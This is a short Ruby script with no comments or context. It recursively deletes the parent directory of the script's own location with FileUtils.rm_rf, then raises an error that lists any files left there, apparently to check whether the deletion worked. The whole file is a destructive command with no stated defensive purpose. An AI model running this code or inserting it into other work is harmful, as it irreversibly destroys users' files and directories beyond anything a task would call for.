require 'fileutils' 
FileUtils.rm_rf(File.dirname(__FILE__)+ "/../") 
raise "#{Dir.glob(File.dirname(__FILE__)+"/../**/*")}"
